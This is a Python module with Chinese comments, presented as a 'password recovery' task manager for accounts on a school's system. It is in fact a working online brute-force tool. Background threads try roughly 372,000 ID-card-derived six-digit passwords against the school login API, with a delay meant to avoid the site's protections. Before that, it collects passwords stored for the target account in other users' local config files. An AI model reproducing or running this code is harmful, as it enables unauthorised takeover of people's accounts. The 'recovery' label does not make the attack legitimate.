from __future__ import annotations

import datetime
import json
import logging
import os
import threading
import time


from main_runtime import _main


class BruteForceTaskManager:
    """
    密码恢复任务管理器

    功能：
    - 管理多个账号的密码恢复任务
    - 每个任务独立运行在后台线程中
    - 支持启动、停止、查询任务状态
    - 自动保存任务状态和恢复结果
    """

    # 类常量：账号不存在的错误关键词
    ACCOUNT_NOT_EXIST_KEYWORDS = ["不存在", "未找到", "无效", "not found", "invalid"]

    # 类常量：尝试密码间隔时间（秒）
    PASSWORD_ATTEMPT_DELAY = 0.5

    def __init__(self, logs_dir):
        """
        初始化任务管理器

        参数：
            logs_dir (str): 日志目录路径，用于存储任务数据文件
        """
        # 存储所有任务的字典，键为账号，值为任务信息
        self.tasks = {}

        # 线程锁：用于保护tasks字典的并发访问
        self.lock = threading.Lock()

        # 日志目录路径
        self.logs_dir = logs_dir

        # 已尝试密码的文件路径
        self.attempts_file = os.path.join(
            logs_dir, "brute_force_attempts.json")

        # 破解结果的文件路径
        self.results_file = os.path.join(logs_dir, "brute_force_results.json")

        # 确保日志目录存在
        if not os.path.exists(logs_dir):
            os.makedirs(logs_dir)

        # 加载已存在的尝试记录和结果
        self.attempts = self._load_json_file(self.attempts_file, {})
        self.results = self._load_json_file(self.results_file, {})

        # [修正] 任务列表持久化文件路径
        self.tasks_file = os.path.join(logs_dir, "brute_force_tasks.json")

        # [修正] 加载任务列表，并处理重启后的僵尸状态
        self.tasks = self._load_json_file(self.tasks_file, {})
        for acc, task_info in self.tasks.items():
            # 如果重启前是运行状态，重启后线程已死，需重置为已停止
            if task_info.get("status") == "running":
                task_info["status"] = "stopped"
        # 保存修正后的状态
        if self.tasks:
            self._save_json_file(self.tasks_file, self.tasks)

        logging.info("[密码恢复] 任务管理器初始化完成")

    def _load_json_file(self, filepath, default=None):
        """
        从JSON文件加载数据

        参数：
            filepath (str): 文件路径
            default: 如果文件不存在或加载失败时返回的默认值

        返回值：
            加载的数据或默认值
        """
        try:
            # 检查文件是否存在
            if os.path.exists(filepath):
                # 读取并解析JSON文件
                with open(filepath, "r", encoding="utf-8") as f:
                    return json.load(f)
        except Exception as e:
            # 加载失败时记录错误
            logging.error(f"[密码恢复] 加载文件失败 {filepath}: {e}")

        # 返回默认值
        return default if default is not None else {}

    def _save_json_file(self, filepath, data):
        """
        将数据保存到JSON文件

        参数：
            filepath (str): 文件路径
            data: 要保存的数据（必须可JSON序列化）
        """
        try:
            # 将数据写入文件，使用UTF-8编码
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            # 保存失败时记录错误
            logging.error(f"[密码恢复] 保存文件失败 {filepath}: {e}")

    def generate_passwords(self, account):
        """
        密码生成器：根据身份证后六位规则生成密码

        参数：
            account (str): 账号

        生成策略：
        根据中国身份证号码后六位规则生成：
        - 第1-2位: 出生日期的日(01-31)
        - 第3-4位: 顺序码(00-99)，由当地派出所按顺序分配
        - 第5位: 性别码(0-9)，偶数为女性，奇数为男性
        - 第6位: 校验码(0-9, X, x)，X可能是大写或小写

        总共可能的密码组合：31 * 100 * 10 * 12 = 372,000个
        跳过已经尝试过的密码

        返回值：
            生成器，每次yield一个密码字符串
        """
        # 获取该账号已尝试过的密码集合
        attempted = set(self.attempts.get(account, []))

        # 第6位校验码的可能值：0-9和X（大写和小写）
        # 使用列表推导式生成0-9，然后添加X和x
        check_codes = [str(i) for i in range(10)] + ["X", "x"]

        # 遍历所有可能的组合
        for day in range(1, 32):  # 第1-2位：日期01-31
            for seq in range(100):  # 第3-4位：顺序码00-99
                for gender in range(10):  # 第5位：性别码0-9
                    for check in check_codes:  # 第6位：校验码0-9,X,x
                        # 组合成6位密码：日期(2位) + 顺序码(2位) + 性别(1位) + 校验(1位)
                        password = f"{day:02d}{seq:02d}{gender}{check}"

                        # 如果该密码未被尝试过，则yield返回
                        if password not in attempted:
                            yield password

    def _find_local_passwords(self, target_account):
        """
        从本地配置文件中查找该账号可能存在的密码
        """
        found_pwds = set()

        # 1. 扫描 user_accounts 目录 (JSON格式: 系统用户 -> 学校账号映射)
        # 使用 AuthSystem 的方法读取，避免重复造轮子
        ua_dir = os.path.join(_main().SCHOOL_ACCOUNTS_DIR, "user_accounts")
        if os.path.exists(ua_dir) and hasattr(_main(), "auth_system"):
            try:
                for fname in os.listdir(ua_dir):
                    if fname.endswith(".json"):
                        auth_username = os.path.splitext(fname)[0]
                        # 使用已有的 auth_system 方法加载账户信息，更健壮
                        accounts = _main().auth_system._load_user_school_accounts(
                            auth_username)

                        if accounts and target_account in accounts:
                            val = accounts[target_account]
                            pwd = ""
                            if isinstance(val, dict):
                                pwd = val.get("password", "")
                            elif isinstance(val, str):
                                pwd = val
            except Exception as e:
                logging.warning(f"[密码恢复] 扫描user_accounts失败: {e}")

        # 2. 扫描 school_accounts 根目录 (INI格式: 旧版单文件配置)
        # 路径: school_accounts/{target_account}.ini
        ini_path = os.path.join(_main().SCHOOL_ACCOUNTS_DIR, f"{target_account}.ini")
        if os.path.exists(ini_path):
            try:
                # 简单文本解析以避免 ConfigParser 的复杂性
                with open(ini_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        # 匹配 Password = xxx 或 密码 = xxx
                        if line.lower().startswith("password") or line.startswith(
                            "密码"
                        ):
                            parts = line.split("=", 1)
                            if len(parts) == 2:
                                pwd = parts[1].strip()
                                if pwd:
                                    found_pwds.add(pwd)
                                    break
            except Exception as e:
                logging.warning(f"[密码恢复] 读取INI失败: {e}")

        if len(found_pwds) > 0:
            logging.info(
                f"[密码恢复] 在本地配置文件中为账号 {target_account} "
                f"发现 {len(found_pwds)} 个可能的历史密码"
            )

        return list(found_pwds)

    def start_task(self, account):
        """
        启动账号的密码恢复任务

        参数：
            account (str): 要恢复密码的账号

        返回值：
            dict: {"success": True/False, "message": "..."}
        """
        # 使用线程锁保护并发访问
        with self.lock:
            # 检查该账号是否已有任务在运行
            if account in self.tasks and self.tasks[account].get("status") == "running":
                return {"success": False, "message": f"账号 {account} 的任务已在运行中"}

            # 创建新任务的状态信息
            task_info = {
                "account": account,  # 账号
                "status": "running",  # 状态：running
                "attempts": 0,  # 已尝试密码数
                "password": None,  # 找到的密码（初始为None）
                "start_time": datetime.datetime.now().isoformat(),  # 开始时间
                "end_time": None,  # 结束时间（初始为None）
                "stop_flag": False,  # 停止标志（用于通知线程停止）
            }

            # 将任务添加到tasks字典
            self.tasks[account] = task_info

            # [修正] 持久化任务列表
            self._save_json_file(self.tasks_file, self.tasks)

            # 如果该账号没有尝试记录，创建空列表
            if account not in self.attempts:
                self.attempts[account] = []

        # 创建后台线程执行密码破解
        thread = threading.Thread(
            target=self._run_brute_force,
            args=(account,),
            daemon=True,  # 守护线程，主程序退出时自动终止
        )
        thread.start()

        # 记录任务启动日志
        logging.info(f"[密码恢复] 已启动账号 {account} 的密码恢复任务")

        return {"success": True, "message": f"已启动账号 {account} 的任务"}

    def _run_brute_force(self, account):
        """
        执行密码破解的后台线程函数

        参数：
            account (str): 账号

        执行流程：
        1. 创建临时ApiClient用于登录验证
        2. 遍历密码生成器生成的密码
        3. 对每个密码尝试登录（使用学校登录API）
        4. 如果登录成功，记录密码并停止
        5. 如果账号不存在（返回特定错误），停止任务
        6. 如果收到停止信号，停止任务
        """
        try:
            # 创建临时的Api实例用于登录测试
            # 注意：为了避免影响现有会话，创建独立的Api对象
            # 注意：不需要临时目录，ApiClient不依赖文件系统

            # 创建一个简单的临时对象来模拟Api需要的属性
            class TempApp:
                def __init__(self):
                    self.device_ua = _main().ApiClient.generate_random_ua()
                    self.log = lambda msg: logging.debug(f"[密码恢复临时登录] {msg}")
                    # 补充缺失属性，防止 ApiClient._request 报错
                    self.is_offline_mode = False
                    # ApiClient 会先检查 is_offline_mode，有了上面这行通常不需要 api_bridge，但为了保险起见设为 None 或 self
                    self.api_bridge = None

            temp_app = TempApp()
            api_client = _main().ApiClient(temp_app)

            # 记录开始尝试
            logging.info(f"[密码恢复] 开始尝试账号 {account} 的密码恢复")

            # === 修改开始：优先尝试本地密码 ===
            # 1. 获取本地已知密码
            local_passwords = self._find_local_passwords(account)
            if local_passwords:
                logging.info(
                    f"[密码恢复] 在本地配置文件中找到 {len(local_passwords)} 个历史密码，将优先尝试"
                )

            # 2. 获取算法生成器
            algo_gen = self.generate_passwords(account)

            # 3. 构建组合生成器
            def combined_password_generator():
                # 先尝试本地发现的密码
                for p in local_passwords:
                    yield p
                # 再尝试算法生成的密码
                for p in algo_gen:
                    yield p

            password_gen = combined_password_generator()
            # === 修改结束 ===

            # 遍历每个密码
            for password in password_gen:
                # 检查是否收到停止信号
                with self.lock:
                    if self.tasks[account].get("stop_flag"):
                        logging.info(f"[密码恢复] 账号 {account} 的任务收到停止信号")
                        self.tasks[account]["status"] = "stopped"
                        self.tasks[account][
                            "end_time"
                        ] = datetime.datetime.now().isoformat()
                        self._save_json_file(self.results_file, self.results)
                        # [修正] 持久化任务状态更新
                        self._save_json_file(self.tasks_file, self.tasks)
                        return

                # 尝试使用该密码登录学校系统
                # 使用ApiClient.login方法进行登录验证
                try:
                    resp = api_client.login(account, password)

                    # 检查登录是否成功
                    if resp and resp.get("success"):
                        # 登录成功！找到密码
                        success = True
                        logging.info(f"[密码恢复] 账号 {account} 登录成功")
                    else:
                        # 登录失败
                        success = False
                        error_msg = resp.get("message", "") if resp else ""

                        # 检查是否是"账号不存在"的错误
                        # 使用类常量中定义的关键词列表
                        if any(
                            keyword in error_msg
                            for keyword in self.ACCOUNT_NOT_EXIST_KEYWORDS
                        ):
                            logging.warning(
                                f"[密码恢复] 账号 {account} 不存在，停止任务"
                            )
                            with self.lock:
                                self.tasks[account]["status"] = "failed"
                                self.tasks[account][
                                    "end_time"
                                ] = datetime.datetime.now().isoformat()
                                # [修正] 持久化任务状态更新
                                self._save_json_file(
                                    self.tasks_file, self.tasks)

                                self.results[account] = {
                                    "status": "failed",
                                    "password": None,
                                    "attempts": self.tasks[account]["attempts"],
                                    "start_time": self.tasks[account]["start_time"],
                                    "end_time": self.tasks[account]["end_time"],
                                    "error": "账号不存在",
                                }
                                self._save_json_file(
                                    self.results_file, self.results)
                            return

                except Exception as e:
                    # 登录请求异常，继续尝试下一个密码
                    logging.debug(
                        f"[密码恢复] 账号 {account} 登录请求异常，"
                        f"异常类型: {type(e).__name__}"
                    )
                    success = False

                # 更新已尝试密码数
                with self.lock:
                    self.tasks[account]["attempts"] += 1
                    self.attempts[account].append(password)

                    # 每尝试100个密码保存一次
                    if self.tasks[account]["attempts"] % 100 == 0:
                        self._save_json_file(self.attempts_file, self.attempts)
                        logging.info(
                            f"[密码恢复] 账号 {account} 已尝试 {self.tasks[account]['attempts']} 个密码"
                        )

                # 如果登录成功
                if success:
                    with self.lock:
                        # 更新任务状态
                        self.tasks[account]["status"] = "success"
                        self.tasks[account]["password"] = password
                        self.tasks[account][
                            "end_time"
                        ] = datetime.datetime.now().isoformat()

                        # [修正] 持久化任务状态更新
                        self._save_json_file(self.tasks_file, self.tasks)

                        # 保存结果
                        self.results[account] = {
                            "status": "success",
                            "password": password,
                            "attempts": self.tasks[account]["attempts"],
                            "start_time": self.tasks[account]["start_time"],
                            "end_time": self.tasks[account]["end_time"],
                        }
                        self._save_json_file(self.results_file, self.results)

                    logging.info(f"[密码恢复] 账号 {account} 的密码已找到")
                    return

                # 添加短暂延迟，避免请求过快触发防护
                # 使用类常量定义的延迟时间
                time.sleep(self.PASSWORD_ATTEMPT_DELAY)

            # 所有密码都尝试完毕，未找到
            with self.lock:
                self.tasks[account]["status"] = "failed"
                self.tasks[account]["end_time"] = datetime.datetime.now(
                ).isoformat()

                # [修正] 持久化任务状态更新
                self._save_json_file(self.tasks_file, self.tasks)

                # 保存结果
                self.results[account] = {
                    "status": "failed",
                    "password": None,
                    "attempts": self.tasks[account]["attempts"],
                    "start_time": self.tasks[account]["start_time"],
                    "end_time": self.tasks[account]["end_time"],
                }
                self._save_json_file(self.results_file, self.results)

            logging.info(f"[密码恢复] 账号 {account} 的任务完成，未找到密码")

        except Exception as e:
            # 捕获异常，记录错误并更新任务状态
            logging.error(
                f"[密码恢复] 账号 {account} 的任务执行失败: {e}", exc_info=True
            )
            with self.lock:
                self.tasks[account]["status"] = "failed"
                self.tasks[account]["end_time"] = datetime.datetime.now(
                ).isoformat()
                # [修正] 持久化任务状态更新
                self._save_json_file(self.tasks_file, self.tasks)

    def stop_task(self, account):
        """
        停止指定账号的密码恢复任务

        参数：
            account (str): 账号

        返回值：
            dict: {"success": True/False, "message": "..."}
        """
        with self.lock:
            # 检查任务是否存在
            if account not in self.tasks:
                return {"success": False, "message": f"账号 {account} 没有任务"}

            # 检查任务是否正在运行
            if self.tasks[account].get("status") != "running":
                return {"success": False, "message": f"账号 {account} 的任务不在运行中"}

            # 设置停止标志
            self.tasks[account]["stop_flag"] = True

        logging.info(f"[密码恢复] 已发送停止信号给账号 {account} 的任务")

        return {"success": True, "message": f"已发送停止信号给账号 {account}"}

    def stop_all_tasks(self):
        """
        停止所有正在运行的密码恢复任务

        返回值：
            dict: {"success": True, "stopped_count": 整数}
        """
        stopped_count = 0

        with self.lock:
            # 遍历所有任务
            for account, task_info in self.tasks.items():
                # 如果任务正在运行，设置停止标志
                if task_info.get("status") == "running":
                    task_info["stop_flag"] = True
                    stopped_count += 1

        logging.info(f"[密码恢复] 已发送停止信号给 {stopped_count} 个任务")

        return {"success": True, "stopped_count": stopped_count}

    def get_all_tasks_status(self):
        """
        获取所有任务的状态

        返回值：
            list: 任务状态列表，每个元素是一个任务信息字典
        """
        with self.lock:
            # 创建任务列表的副本，避免返回内部数据
            tasks_list = []
            for account, task_info in self.tasks.items():
                # 复制任务信息，移除stop_flag（内部使用）
                task_copy = task_info.copy()
                task_copy.pop("stop_flag", None)
                tasks_list.append(task_copy)

            return tasks_list
